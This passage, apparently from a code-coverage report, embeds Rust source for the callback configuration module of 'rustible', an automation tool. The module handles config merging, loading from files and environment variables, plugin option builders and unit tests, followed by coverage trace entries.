#[serde(default)]\n    pub options: HashMap\u003cString, JsonValue\u003e,\n}\n\nimpl Default for CallbackConfig {\n    fn default() -\u003e Self {\n        Self {\n            plugin: \"default\".to_string(),\n            default_plugin: \"default\".to_string(),\n            enabled_plugins: vec![\"default\".to_string()],\n            verbosity: 1,\n            show_diff: false,\n            check_mode: false,\n            output: \"stdout\".to_string(),\n            use_colors: true,\n            show_task_timing: false,\n            show_skipped: true,\n            show_ok: true,\n            show_recap: true,\n            plugins: HashMap::new(),\n            options: HashMap::new(),\n        }\n    }\n}\n\nimpl CallbackConfig {\n    /// Create a new callback configuration with default values.\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Create a configuration for a specific plugin.\n    pub fn for_plugin(plugin: \u0026str) -\u003e Self {\n        Self {\n            plugin: plugin.to_string(),\n            default_plugin: plugin.to_string(),\n            enabled_plugins: vec![plugin.to_string()],\n            ..Default::default()\n        }\n    }\n\n    /// Get plugin-specific configuration.\n    pub fn get_plugin_config(\u0026self, plugin_name: \u0026str) -\u003e Option\u003c\u0026PluginConfig\u003e {\n        self.plugins.get(plugin_name)\n    }\n\n    /// Get mutable plugin-specific configuration, creating if necessary.\n    pub fn get_or_create_plugin_config(\u0026mut self, plugin_name: \u0026str) -\u003e \u0026mut PluginConfig {\n        self.plugins\n            .entry(plugin_name.to_string())\n            .or_insert_with(PluginConfig::default)\n    }\n\n    /// Check if a specific plugin is enabled.\n    pub fn is_plugin_enabled(\u0026self, plugin_name: \u0026str) -\u003e bool {\n        // Check enabled_plugins list\n        if self.enabled_plugins.contains(\u0026plugin_name.to_string()) {\n            // Check per-plugin enabled flag\n            self.plugins\n                .get(plugin_name)\n                .map(|p| p.enabled)\n                .unwrap_or(true)\n        } else {\n            false\n        }\n    }\n\n    /// Set verbosity level with bounds checking.\n    pub fn set_verbosity(\u0026mut self, level: u8) {\n        self.verbosity = level.min(4);\n    }\n\n    /// Enable a plugin.\n    pub fn enable_plugin(\u0026mut self, plugin_name: \u0026str) {\n        if !self.enabled_plugins.contains(\u0026plugin_name.to_string()) {\n            self.enabled_plugins.push(plugin_name.to_string());\n        }\n        self.get_or_create_plugin_config(plugin_name).enabled = true;\n    }\n\n    /// Disable a plugin.\n    pub fn disable_plugin(\u0026mut self, plugin_name: \u0026str) {\n        self.enabled_plugins.retain(|p| p != plugin_name);\n        if let Some(config) = self.plugins.get_mut(plugin_name) {\n            config.enabled = false;\n        }\n    }\n\n    /// Merge another configuration into this one (other takes precedence).\n    pub fn merge(\u0026mut self, other: CallbackConfig) {\n        // Override scalar values if they differ from defaults\n        if other.plugin != \"default\" {\n            self.plugin = other.plugin;\n        }\n        if other.default_plugin != \"default\" {\n            self.default_plugin = other.default_plugin;\n        }\n        if !other.enabled_plugins.is_empty()\n            \u0026\u0026 other.enabled_plugins != vec![\"default\".to_string()]\n        {\n            self.enabled_plugins = other.enabled_plugins;\n        }\n        if other.verbosity != 1 {\n            self.verbosity = other.verbosity;\n        }\n        if other.show_diff {\n            self.show_diff = true;\n        }\n        if other.check_mode {\n            self.check_mode = true;\n        }\n        if other.output != \"stdout\" {\n            self.output = other.output;\n        }\n        if !other.use_colors {\n            self.use_colors = false;\n        }\n        if other.show_task_timing {\n            self.show_task_timing = true;\n        }\n        if !other.show_skipped {\n            self.show_skipped = false;\n        }\n        if !other.show_ok {\n            self.show_ok = false;\n        }\n        if !other.show_recap {\n            self.show_recap = false;\n        }\n\n        // Merge per-plugin configurations\n        for (name, config) in other.plugins {\n            self.plugins\n                .entry(name)\n                .and_modify(|existing| existing.merge(\u0026config))\n                .or_insert(config);\n        }\n\n        // Merge additional options\n        self.options.extend(other.options);\n    }\n}\n\n// ============================================================================\n// Per-Plugin Configuration\n// ============================================================================\n\n/// Configuration for a specific callback plugin.\n#[derive(Debug, Clone, Default, Serialize, Deserialize)]\n#[serde(default)]\npub struct PluginConfig {\n    /// Whether this plugin is enabled\n    pub enabled: bool,\n\n    /// Plugin priority (lower values run first)\n    pub priority: Option\u003ci32\u003e,\n\n    /// Output destination override for this plugin\n    pub output: Option\u003cString\u003e,\n\n    /// Plugin-specific options\n    #[serde(flatten)]\n    pub options: HashMap\u003cString, JsonValue\u003e,\n}\n\nimpl PluginConfig {\n    /// Create a new enabled plugin configuration.\n    pub fn enabled() -\u003e Self {\n        Self {\n            enabled: true,\n            ..Default::default()\n        }\n    }\n\n    /// Create a new disabled plugin configuration.\n    pub fn disabled() -\u003e Self {\n        Self {\n            enabled: false,\n            ..Default::default()\n        }\n    }\n\n    /// Get an option value as a specific type.\n    pub fn get_option\u003cT: serde::de::DeserializeOwned\u003e(\u0026self, key: \u0026str) -\u003e Option\u003cT\u003e {\n        self.options\n            .get(key)\n            .and_then(|v| serde_json::from_value(v.clone()).ok())\n    }\n\n    /// Get an option value as a string.\n    pub fn get_string(\u0026self, key: \u0026str) -\u003e Option\u003cString\u003e {\n        self.options.get(key).and_then(|v| v.as_str().map(String::from))\n    }\n\n    /// Get an option value as a boolean.\n    pub fn get_bool(\u0026self, key: \u0026str) -\u003e Option\u003cbool\u003e {\n        self.options.get(key).and_then(|v| v.as_bool())\n    }\n\n    /// Get an option value as an integer.\n    pub fn get_i64(\u0026self, key: \u0026str) -\u003e Option\u003ci64\u003e {\n        self.options.get(key).and_then(|v| v.as_i64())\n    }\n\n    /// Get an option value as a float.\n    pub fn get_f64(\u0026self, key: \u0026str) -\u003e Option\u003cf64\u003e {\n        self.options.get(key).and_then(|v| v.as_f64())\n    }\n\n    /// Set an option value.\n    pub fn set_option(\u0026mut self, key: impl Into\u003cString\u003e, value: impl Into\u003cJsonValue\u003e) {\n        self.options.insert(key.into(), value.into());\n    }\n\n    /// Merge another plugin config into this one.\n    pub fn merge(\u0026mut self, other: \u0026PluginConfig) {\n        if other.enabled {\n            self.enabled = true;\n        }\n        if other.priority.is_some() {\n            self.priority = other.priority;\n        }\n        if other.output.is_some() {\n            self.output = other.output.clone();\n        }\n        self.options.extend(other.options.clone());\n    }\n}\n\n// ============================================================================\n// Configuration Loader\n// ============================================================================\n\n/// Builder for loading callback configuration from multiple sources.\n///\n/// Sources are applied in order, with later sources overriding earlier ones:\n/// 1. Default values\n/// 2. Configuration files\n/// 3. Environment variables\n/// 4. CLI arguments\n#[derive(Debug, Default)]\npub struct CallbackConfigLoader {\n    /// Configuration files to load (in order)\n    config_files: Vec\u003cPathBuf\u003e,\n    /// Environment variable prefix\n    env_prefix: Option\u003cString\u003e,\n    /// CLI overrides\n    cli_overrides: CallbackConfig,\n    /// Whether to load from standard locations\n    load_standard_locations: bool,\n}\n\nimpl CallbackConfigLoader {\n    /// Create a new configuration loader.\n    pub fn new() -\u003e Self {\n        Self {\n            config_files: Vec::new(),\n            env_prefix: Some(\"RUSTIBLE_CALLBACK\".to_string()),\n            cli_overrides: CallbackConfig::default(),\n            load_standard_locations: true,\n        }\n    }\n\n    /// Add a configuration file to load.\n    pub fn with_file(mut self, path: impl AsRef\u003cPath\u003e) -\u003e Self {\n        self.config_files.push(path.as_ref().to_path_buf());\n        self\n    }\n\n    /// Set the environment variable prefix.\n    pub fn with_env_prefix(mut self, prefix: impl Into\u003cString\u003e) -\u003e Self {\n        self.env_prefix = Some(prefix.into());\n        self\n    }\n\n    /// Disable environment variable loading.\n    pub fn without_env(mut self) -\u003e Self {\n        self.env_prefix = None;\n        self\n    }\n\n    /// Disable loading from standard configuration locations.\n    pub fn without_standard_locations(mut self) -\u003e Self {\n        self.load_standard_locations = false;\n        self\n    }\n\n    /// Set CLI override for the default plugin.\n    pub fn with_plugin(mut self, plugin: impl Into\u003cString\u003e) -\u003e Self {\n        self.cli_overrides.plugin = plugin.into();\n        self\n    }\n\n    /// Set CLI override for verbosity.\n    pub fn with_verbosity(mut self, level: u8) -\u003e Self {\n        self.cli_overrides.verbosity = level;\n        self\n    }\n\n    /// Set CLI override for diff display.\n    pub fn with_show_diff(mut self, show: bool) -\u003e Self {\n        self.cli_overrides.show_diff = show;\n        self\n    }\n\n    /// Set CLI override for check mode.\n    pub fn with_check_mode(mut self, check: bool) -\u003e Self {\n        self.cli_overrides.check_mode = check;\n        self\n    }\n\n    /// Set CLI override for colors.\n    pub fn with_colors(mut self, use_colors: bool) -\u003e Self {\n        self.cli_overrides.use_colors = use_colors;\n        self\n    }\n\n    /// Load configuration from all sources.\n    pub fn load(self) -\u003e Result\u003cCallbackConfig\u003e {\n        let mut config = CallbackConfig::default();\n\n        // Load from standard locations if enabled\n        if self.load_standard_locations {\n            for path in Self::standard_config_paths() {\n                if path.exists() {\n                    debug!(\"Loading callback config from: {}\", path.display());\n                    if let Ok(file_config) = Self::load_file(\u0026path) {\n                        config.merge(file_config);\n                    }\n                }\n            }\n        }\n\n        // Load from explicitly specified files\n        for path in \u0026self.config_files {\n            if path.exists() {\n                debug!(\"Loading callback config from: {}\", path.display());\n                let file_config = Self::load_file(path)\n                    .with_context(|| format!(\"Failed to load config from: {}\", path.display()))?;\n                config.merge(file_config);\n            } else {\n                warn!(\"Callback config file not found: {}\", path.display());\n            }\n        }\n\n        // Apply environment variables\n        if let Some(prefix) = \u0026self.env_prefix {\n            let env_config = Self::load_from_env(prefix);\n            config.merge(env_config);\n        }\n\n        // Apply CLI overrides (highest priority)\n        config.merge(self.cli_overrides);\n\n        Ok(config)\n    }\n\n    /// Get standard configuration file locations.\n    fn standard_config_paths() -\u003e Vec\u003cPathBuf\u003e {\n        let mut paths = Vec::new();\n\n        // System-wide config\n        paths.push(PathBuf::from(\"/etc/rustible/callbacks.toml\"));\n        paths.push(PathBuf::from(\"/etc/rustible/callbacks.yml\"));\n\n        // User config\n        if let Some(home) = dirs::home_dir() {\n            paths.push(home.join(\".rustible/callbacks.toml\"));\n            paths.push(home.join(\".rustible/callbacks.yml\"));\n            paths.push(home.join(\".config/rustible/callbacks.toml\"));\n        }\n\n        // XDG config\n        if let Ok(xdg_config) = env::var(\"XDG_CONFIG_HOME\") {\n            paths.push(PathBuf::from(xdg_config).join(\"rustible/callbacks.toml\"));\n        }\n\n        // Project-local config\n        paths.push(PathBuf::from(\"rustible-callbacks.toml\"));\n        paths.push(PathBuf::from(\".rustible/callbacks.toml\"));\n\n        paths\n    }\n\n    /// Load configuration from a file.\n    fn load_file(path: \u0026Path) -\u003e Result\u003cCallbackConfig\u003e {\n        let content = fs::read_to_string(path)\n            .with_context(|| format!(\"Failed to read config file: {}\", path.display()))?;\n\n        let extension = path.extension().and_then(|e| e.to_str()).unwrap_or(\"\");\n\n        // Parse based on file extension\n        let wrapper: CallbacksWrapper = match extension {\n            \"toml\" =\u003e toml::from_str(\u0026content)?,\n            \"yml\" | \"yaml\" =\u003e serde_yaml::from_str(\u0026content)?,\n            \"json\" =\u003e serde_json::from_str(\u0026content)?,\n            _ =\u003e {\n                // Try TOML first, then YAML\n                toml::from_str(\u0026content)\n                    .or_else(|_| serde_yaml::from_str(\u0026content))\n                    .with_context(|| {\n                        format!(\"Failed to parse config file: {}\", path.display())\n                    })?\n            }\n        };\n\n        Ok(wrapper.callbacks)\n    }\n\n    /// Load configuration from environment variables.\n    fn load_from_env(prefix: \u0026str) -\u003e CallbackConfig {\n        let mut config = CallbackConfig::default();\n\n        // Main callback plugin\n        if let Ok(val) = env::var(prefix) {\n            config.plugin = val.clone();\n            config.default_plugin = val;\n        }\n\n        // Enabled plugins (comma-separated)\n        if let Ok(val) = env::var(format!(\"{}_ENABLED\", prefix)) {\n            config.enabled_plugins = val.split(',').map(|s| s.trim().to_string()).collect();\n        }\n\n        // Verbosity\n        if let Ok(val) = env::var(format!(\"{}_VERBOSITY\", prefix)) {\n            if let Ok(level) = val.parse::\u003cu8\u003e() {\n                config.verbosity = level.min(4);\n            }\n        }\n\n        // Show diff\n        if let Ok(val) = env::var(format!(\"{}_SHOW_DIFF\", prefix)) {\n            config.show_diff = val.to_lowercase() == \"true\" || val == \"1\";\n        }\n\n        // Check mode\n        if let Ok(val) = env::var(format!(\"{}_CHECK_MODE\", prefix)) {\n            config.check_mode = val.to_lowercase() == \"true\" || val == \"1\";\n        }\n\n        // Output\n        if let Ok(val) = env::var(format!(\"{}_OUTPUT\", prefix)) {\n            config.output = val;\n        }\n\n        // Colors\n        if let Ok(val) = env::var(format!(\"{}_NO_COLOR\", prefix)) {\n            if val.to_lowercase() == \"true\" || val == \"1\" {\n                config.use_colors = false;\n            }\n        }\n        // Also check standard NO_COLOR\n        if env::var(\"NO_COLOR\").is_ok() {\n            config.use_colors = false;\n        }\n\n        // Show task timing\n        if let Ok(val) = env::var(format!(\"{}_SHOW_TIMING\", prefix)) {\n            config.show_task_timing = val.to_lowercase() == \"true\" || val == \"1\";\n        }\n\n        // Load per-plugin options from environment\n        config.plugins.extend(Self::load_plugin_env_vars(prefix));\n\n        config\n    }\n\n    /// Load plugin-specific configuration from environment variables.\n    fn load_plugin_env_vars(prefix: \u0026str) -\u003e HashMap\u003cString, PluginConfig\u003e {\n        let mut plugins = HashMap::new();\n\n        // Scan all environment variables for plugin-specific settings\n        for (key, value) in env::vars() {\n            // Pattern: RUSTIBLE_CALLBACK_\u003cPLUGIN\u003e_\u003cOPTION\u003e\n            if let Some(suffix) = key.strip_prefix(\u0026format!(\"{}_\", prefix)) {\n                // Skip non-plugin vars\n                if [\"VERBOSITY\", \"SHOW_DIFF\", \"CHECK_MODE\", \"OUTPUT\", \"NO_COLOR\", \"ENABLED\", \"SHOW_TIMING\"]\n                    .contains(\u0026suffix)\n                {\n                    continue;\n                }\n\n                // Split into plugin name and option\n                let parts: Vec\u003c\u0026str\u003e = suffix.splitn(2, '_').collect();\n                if parts.len() == 2 {\n                    let plugin_name = parts[0].to_lowercase();\n                    let option_name = parts[1].to_lowercase();\n\n                    let plugin_config = plugins\n                        .entry(plugin_name)\n                        .or_insert_with(PluginConfig::default);\n\n                    // Try to parse as JSON value, fall back to string\n                    let json_value: JsonValue = if let Ok(v) = serde_json::from_str(\u0026value) {\n                        v\n                    } else if let Ok(b) = value.parse::\u003cbool\u003e() {\n                        JsonValue::Bool(b)\n                    } else if let Ok(n) = value.parse::\u003ci64\u003e() {\n                        JsonValue::Number(n.into())\n                    } else if let Ok(n) = value.parse::\u003cf64\u003e() {\n                        serde_json::Number::from_f64(n)\n                            .map(JsonValue::Number)\n                            .unwrap_or(JsonValue::String(value.clone()))\n                    } else {\n                        JsonValue::String(value)\n                    };\n\n                    // Handle special options\n                    match option_name.as_str() {\n                        \"enabled\" =\u003e {\n                            plugin_config.enabled = json_value\n                                .as_bool()\n                                .unwrap_or(json_value.as_str() == Some(\"true\"));\n                        }\n                        \"priority\" =\u003e {\n                            plugin_config.priority = json_value.as_i64().map(|n| n as i32);\n                        }\n                        \"output\" =\u003e {\n                            plugin_config.output = json_value.as_str().map(String::from);\n                        }\n                        _ =\u003e {\n                            plugin_config.options.insert(option_name, json_value);\n                        }\n                    }\n                }\n            }\n        }\n\n        plugins\n    }\n}\n\n/// Wrapper for config file format that nests under [callbacks].\n#[derive(Debug, Deserialize)]\nstruct CallbacksWrapper {\n    #[serde(default)]\n    callbacks: CallbackConfig,\n}\n\n// ============================================================================\n// Plugin-Specific Configuration Helpers\n// ============================================================================\n\n/// Configuration builder for the Timer callback plugin.\n#[derive(Debug, Clone, Default)]\npub struct TimerPluginConfig {\n    inner: PluginConfig,\n}\n\nimpl TimerPluginConfig {\n    /// Create a new timer plugin configuration.\n    pub fn new() -\u003e Self {\n        let mut config = Self::default();\n        config.inner.enabled = true;\n        config\n    }\n\n    /// Set whether to show timing after each task.\n    pub fn show_per_task(mut self, enabled: bool) -\u003e Self {\n        self.inner.set_option(\"show_per_task\", enabled);\n        self\n    }\n\n    /// Set whether to show timing summary at end.\n    pub fn show_summary(mut self, enabled: bool) -\u003e Self {\n        self.inner.set_option(\"show_summary\", enabled);\n        self\n    }\n\n    /// Set number of slowest tasks to show.\n    pub fn top_slowest(mut self, count: usize) -\u003e Self {\n        self.inner.set_option(\"top_slowest\", count as i64);\n        self\n    }\n\n    /// Set minimum threshold for showing task timing (seconds).\n    pub fn threshold_secs(mut self, seconds: f64) -\u003e Self {\n        self.inner.set_option(\"threshold_secs\", seconds);\n        self\n    }\n\n    /// Set whether to show play-level timing.\n    pub fn show_play_timing(mut self, enabled: bool) -\u003e Self {\n        self.inner.set_option(\"show_play_timing\", enabled);\n        self\n    }\n\n    /// Build the plugin configuration.\n    pub fn build(self) -\u003e PluginConfig {\n        self.inner\n    }\n}\n\n/// Configuration builder for the JSON callback plugin.\n#[derive(Debug, Clone, Default)]\npub struct JsonPluginConfig {\n    inner: PluginConfig,\n}\n\nimpl JsonPluginConfig {\n    /// Create a new JSON plugin configuration.\n    pub fn new() -\u003e Self {\n        let mut config = Self::default();\n        config.inner.enabled = true;\n        config\n    }\n\n    /// Set output destination.\n    pub fn output(mut self, path: impl Into\u003cString\u003e) -\u003e Self {\n        self.inner.output = Some(path.into());\n        self\n    }\n\n    /// Set whether to show full result data.\n    pub fn show_full_result(mut self, enabled: bool) -\u003e Self {\n        self.inner.set_option(\"show_full_result\", enabled);\n        self\n    }\n\n    /// Set whether to show task arguments.\n    pub fn show_task_args(mut self, enabled: bool) -\u003e Self {\n        self.inner.set_option(\"show_task_args\", enabled);\n        self\n    }\n\n    /// Set indentation level (0 for compact).\n    pub fn indent(mut self, spaces: usize) -\u003e Self {\n        self.inner.set_option(\"indent\", spaces as i64);\n        self\n    }\n\n    /// Build the plugin configuration.\n    pub fn build(self) -\u003e PluginConfig {\n        self.inner\n    }\n}\n\n/// Configuration builder for the ProfileTasks callback plugin.\n#[derive(Debug, Clone, Default)]\npub struct ProfileTasksPluginConfig {\n    inner: PluginConfig,\n}\n\nimpl ProfileTasksPluginConfig {\n    /// Create a new profile tasks plugin configuration.\n    pub fn new() -\u003e Self {\n        let mut config = Self::default();\n        config.inner.enabled = true;\n        config\n    }\n\n    /// Set threshold for marking tasks as slow (seconds).\n    pub fn slow_threshold_secs(mut self, seconds: f64) -\u003e Self {\n        self.inner.set_option(\"slow_threshold_secs\", seconds);\n        self\n    }\n\n    /// Set threshold for marking tasks as bottlenecks (seconds).\n    pub fn bottleneck_threshold_secs(mut self, seconds: f64) -\u003e Self {\n        self.inner.set_option(\"bottleneck_threshold_secs\", seconds);\n        self\n    }\n\n    /// Set number of tasks to show in summary.\n    pub fn top_tasks_count(mut self, count: usize) -\u003e Self {\n        self.inner.set_option(\"top_tasks_count\", count as i64);\n        self\n    }\n\n    /// Set whether to show per-host breakdown.\n    pub fn show_per_host(mut self, enabled: bool) -\u003e Self {\n        self.inner.set_option(\"show_per_host\", enabled);\n        self\n    }\n\n    /// Set whether to include skipped tasks.\n    pub fn include_skipped(mut self, enabled: bool) -\u003e Self {\n        self.inner.set_option(\"include_skipped\", enabled);\n        self\n    }\n\n    /// Build the plugin configuration.\n    pub fn build(self) -\u003e PluginConfig {\n        self.inner\n    }\n}\n\n/// Configuration builder for the Minimal callback plugin.\n#[derive(Debug, Clone, Default)]\npub struct MinimalPluginConfig {\n    inner: PluginConfig,\n}\n\nimpl MinimalPluginConfig {\n    /// Create a new minimal plugin configuration.\n    pub fn new() -\u003e Self {\n        let mut config = Self::default();\n        config.inner.enabled = true;\n        config\n    }\n\n    /// Build the plugin configuration.\n    pub fn build(self) -\u003e PluginConfig {\n        self.inner\n    }\n}\n\n// ============================================================================\n// Convenience Functions\n// ============================================================================\n\n/// Load callback configuration from the default locations.\npub fn load_callback_config() -\u003e Result\u003cCallbackConfig\u003e {\n    CallbackConfigLoader::new().load()\n}\n\n/// Load callback configuration from a specific file.\npub fn load_callback_config_from_file(path: impl AsRef\u003cPath\u003e) -\u003e Result\u003cCallbackConfig\u003e {\n    CallbackConfigLoader::new()\n        .without_standard_locations()\n        .with_file(path)\n        .load()\n}\n\n/// Create a callback configuration from CLI arguments.\n///\n/// This is a convenience function for integrating with clap CLI parsing.\npub fn config_from_cli(\n    callback: Option\u003c\u0026str\u003e,\n    verbosity: u8,\n    show_diff: bool,\n    check_mode: bool,\n    no_color: bool,\n) -\u003e CallbackConfig {\n    let mut config = CallbackConfig::default();\n\n    if let Some(cb) = callback {\n        config.plugin = cb.to_string();\n        config.default_plugin = cb.to_string();\n        config.enabled_plugins = vec![cb.to_string()];\n    }\n\n    config.verbosity = verbosity;\n    config.show_diff = show_diff;\n    config.check_mode = check_mode;\n    config.use_colors = !no_color;\n\n    config\n}\n\n// ============================================================================\n// Tests\n// ============================================================================\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use std::io::Write;\n    use tempfile::NamedTempFile;\n\n    #[test]\n    fn test_default_config() {\n        let config = CallbackConfig::default();\n        assert_eq!(config.plugin, \"default\");\n        assert_eq!(config.verbosity, 1);\n        assert!(!config.show_diff);\n        assert!(config.use_colors);\n        assert!(config.show_recap);\n    }\n\n    #[test]\n    fn test_config_for_plugin() {\n        let config = CallbackConfig::for_plugin(\"json\");\n        assert_eq!(config.plugin, \"json\");\n        assert_eq!(config.default_plugin, \"json\");\n        assert_eq!(config.enabled_plugins, vec![\"json\"]);\n    }\n\n    #[test]\n    fn test_config_merge() {\n        let mut config = CallbackConfig::default();\n        let other = CallbackConfig {\n            plugin: \"json\".to_string(),\n            verbosity: 3,\n            show_diff: true,\n            ..Default::default()\n        };\n\n        config.merge(other);\n\n        assert_eq!(config.plugin, \"json\");\n        assert_eq!(config.verbosity, 3);\n        assert!(config.show_diff);\n    }\n\n    #[test]\n    fn test_plugin_config() {\n        let mut config = PluginConfig::enabled();\n        config.set_option(\"threshold\", 10.5);\n        config.set_option(\"enabled_feature\", true);\n        config.set_option(\"name\", \"test\");\n\n        assert!(config.enabled);\n        assert_eq!(config.get_f64(\"threshold\"), Some(10.5));\n        assert_eq!(config.get_bool(\"enabled_feature\"), Some(true));\n        assert_eq!(config.get_string(\"name\"), Some(\"test\".to_string()));\n    }\n\n    #[test]\n    fn test_plugin_enable_disable() {\n        let mut config = CallbackConfig::default();\n\n        config.enable_plugin(\"timer\");\n        assert!(config.is_plugin_enabled(\"timer\"));\n        assert!(config.enabled_plugins.contains(\u0026\"timer\".to_string()));\n\n        config.disable_plugin(\"timer\");\n        assert!(!config.is_plugin_enabled(\"timer\"));\n        assert!(!config.enabled_plugins.contains(\u0026\"timer\".to_string()));\n    }\n\n    #[test]\n    fn test_timer_plugin_config_builder() {\n        let config = TimerPluginConfig::new()\n            .show_per_task(true)\n            .show_summary(true)\n            .top_slowest(20)\n            .threshold_secs(1.5)\n            .build();\n\n        assert!(config.enabled);\n        assert_eq!(config.get_bool(\"show_per_task\"), Some(true));\n        assert_eq!(config.get_bool(\"show_summary\"), Some(true));\n        assert_eq!(config.get_i64(\"top_slowest\"), Some(20));\n        assert_eq!(config.get_f64(\"threshold_secs\"), Some(1.5));\n    }\n\n    #[test]\n    fn test_json_plugin_config_builder() {\n        let config = JsonPluginConfig::new()\n            .output(\"/var/log/test.jsonl\")\n            .show_full_result(true)\n            .indent(2)\n            .build();\n\n        assert!(config.enabled);\n        assert_eq!(config.output, Some(\"/var/log/test.jsonl\".to_string()));\n        assert_eq!(config.get_bool(\"show_full_result\"), Some(true));\n        assert_eq!(config.get_i64(\"indent\"), Some(2));\n    }\n\n    #[test]\n    fn test_profile_tasks_plugin_config_builder() {\n        let config = ProfileTasksPluginConfig::new()\n            .slow_threshold_secs(5.0)\n            .bottleneck_threshold_secs(15.0)\n            .top_tasks_count(25)\n            .show_per_host(true)\n            .build();\n\n        assert!(config.enabled);\n        assert_eq!(config.get_f64(\"slow_threshold_secs\"), Some(5.0));\n        assert_eq!(config.get_f64(\"bottleneck_threshold_secs\"), Some(15.0));\n        assert_eq!(config.get_i64(\"top_tasks_count\"), Some(25));\n        assert_eq!(config.get_bool(\"show_per_host\"), Some(true));\n    }\n\n    #[test]\n    fn test_load_toml_config() {\n        let toml_content = r#\"\n[callbacks]\nplugin = \"timer\"\nverbosity = 2\nshow_diff = true\n\n[callbacks.plugins.timer]\nenabled = true\nshow_per_task = true\nthreshold_secs = 1.0\n\n[callbacks.plugins.json]\nenabled = false\noutput = \"/tmp/output.jsonl\"\n\"#;\n\n        let mut file = NamedTempFile::with_suffix(\".toml\").unwrap();\n        file.write_all(toml_content.as_bytes()).unwrap();\n\n        let config = CallbackConfigLoader::new()\n            .without_standard_locations()\n            .without_env()\n            .with_file(file.path())\n            .load()\n            .unwrap();\n\n        assert_eq!(config.plugin, \"timer\");\n        assert_eq!(config.verbosity, 2);\n        assert!(config.show_diff);\n\n        let timer_config = config.get_plugin_config(\"timer\").unwrap();\n        assert!(timer_config.enabled);\n        assert_eq!(timer_config.get_bool(\"show_per_task\"), Some(true));\n        assert_eq!(timer_config.get_f64(\"threshold_secs\"), Some(1.0));\n\n        let json_config = config.get_plugin_config(\"json\").unwrap();\n        assert!(!json_config.enabled);\n        assert_eq!(json_config.output, Some(\"/tmp/output.jsonl\".to_string()));\n    }\n\n    #[test]\n    fn test_load_yaml_config() {\n        let yaml_content = r#\"\ncallbacks:\n  plugin: minimal\n  verbosity: 3\n  show_diff: true\n  plugins:\n    minimal:\n      enabled: true\n    profile_tasks:\n      enabled: true\n      slow_threshold_secs: 5.0\n\"#;\n\n        let mut file = NamedTempFile::with_suffix(\".yml\").unwrap();\n        file.write_all(yaml_content.as_bytes()).unwrap();\n\n        let config = CallbackConfigLoader::new()\n            .without_standard_locations()\n            .without_env()\n            .with_file(file.path())\n            .load()\n            .unwrap();\n\n        assert_eq!(config.plugin, \"minimal\");\n        assert_eq!(config.verbosity, 3);\n\n        let profile_config = config.get_plugin_config(\"profile_tasks\").unwrap();\n        assert!(profile_config.enabled);\n        assert_eq!(profile_config.get_f64(\"slow_threshold_secs\"), Some(5.0));\n    }\n\n    #[test]\n    fn test_config_from_cli() {\n        let config = config_from_cli(Some(\"json\"), 2, true, true, false);\n\n        assert_eq!(config.plugin, \"json\");\n        assert_eq!(config.verbosity, 2);\n        assert!(config.show_diff);\n        assert!(config.check_mode);\n        assert!(config.use_colors);\n    }\n\n    #[test]\n    fn test_config_from_cli_no_color() {\n        let config = config_from_cli(None, 1, false, false, true);\n\n        assert_eq!(config.plugin, \"default\");\n        assert!(!config.use_colors);\n    }\n\n    #[test]\n    fn test_env_loading() {\n        // Set test environment variables\n        env::set_var(\"TEST_CALLBACK\", \"json\");\n        env::set_var(\"TEST_CALLBACK_VERBOSITY\", \"3\");\n        env::set_var(\"TEST_CALLBACK_SHOW_DIFF\", \"true\");\n        env::set_var(\"TEST_CALLBACK_TIMER_ENABLED\", \"true\");\n        env::set_var(\"TEST_CALLBACK_TIMER_THRESHOLD_SECS\", \"2.5\");\n\n        let config = CallbackConfigLoader::load_from_env(\"TEST_CALLBACK\");\n\n        assert_eq!(config.plugin, \"json\");\n        assert_eq!(config.verbosity, 3);\n        assert!(config.show_diff);\n\n        let timer_config = config.plugins.get(\"timer\").unwrap();\n        assert!(timer_config.enabled);\n        assert_eq!(timer_config.get_f64(\"threshold_secs\"), Some(2.5));\n\n        // Clean up\n        env::remove_var(\"TEST_CALLBACK\");\n        env::remove_var(\"TEST_CALLBACK_VERBOSITY\");\n        env::remove_var(\"TEST_CALLBACK_SHOW_DIFF\");\n        env::remove_var(\"TEST_CALLBACK_TIMER_ENABLED\");\n        env::remove_var(\"TEST_CALLBACK_TIMER_THRESHOLD_SECS\");\n    }\n\n    #[test]\n    fn test_get_or_create_plugin_config() {\n        let mut config = CallbackConfig::default();\n\n        // Plugin doesn't exist yet\n        assert!(config.get_plugin_config(\"new_plugin\").is_none());\n\n        // Create it\n        let plugin_config = config.get_or_create_plugin_config(\"new_plugin\");\n        plugin_config.enabled = true;\n        plugin_config.set_option(\"test_option\", 42);\n\n        // Now it exists\n        let retrieved = config.get_plugin_config(\"new_plugin\").unwrap();\n        assert!(retrieved.enabled);\n        assert_eq!(retrieved.get_i64(\"test_option\"), Some(42));\n    }\n\n    #[test]\n    fn test_set_verbosity_bounds() {\n        let mut config = CallbackConfig::default();\n\n        config.set_verbosity(10); // Above max\n        assert_eq!(config.verbosity, 4);\n\n        config.set_verbosity(2);\n        assert_eq!(config.verbosity, 2);\n\n        config.set_verbosity(0);\n        assert_eq!(config.verbosity, 0);\n    }\n}\n","traces":[{"line":337,"address":[],"length":0,"stats":{"Line":0}},{"line":338,"address":[],"length":0,"stats":{"Line":0}},{"line":339,"address":[],"length":0,"stats":{"Line":0}},{"line":340,"address":[],"length":0,"stats":{"Line":0}},{"line":364,"address":[],"length":0,"stats":{"Line":0}},{"line":365,"address":[],"length":0,"stats":{"Line":0}},{"line":418,"address":[],"length":0,"stats":{"Line":0}},{"line":419,"address":[],"length":0,"stats":{"Line":0}},{"line":420,"address":[],"length":0,"stats":{"Line":0}},{"line":424,"address":[],"length":0,"stats":{"Line":0}},{"line":425,"address":[],"length":0,"stats":{"Line":0}},{"line":426,"address":[],"length":0,"stats":{"Line":0}},{"line":442,"address":[],"length":0,"stats":{"Line":0}},{"line":443,"address":[],"length":0,"stats":{"Line":0}},{"line":444,"address":[],"length":0,"stats":{"Line":0}},{"line":763,"address":[],"length":0,"stats":{"Line":0}},{"line":764,"address":[],"length":0,"stats":{"Line":0}},{"line":765,"address":[],"length":0,"stats":{"Line":0}},{"line":872,"address":[],"length":0,"stats":{"Line":0}},{"line":873,"address":[],"length":0,"stats":{"Line":0}},{"line":875,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":21},{"path":["/","home","artur","Repositories","rustible","src","callback","factory.rs"],"content":"//! Plugin Factory for Rustible Callback System\n//!\n//! This module provides a factory for creating callback plugins by name string.\n//! It supports all built-in plugins, handles configuration options, and provides\n//! proper error handling for unknown plugins.\n//!\n//! # Features\n//!\n//! - Create plugins by name string 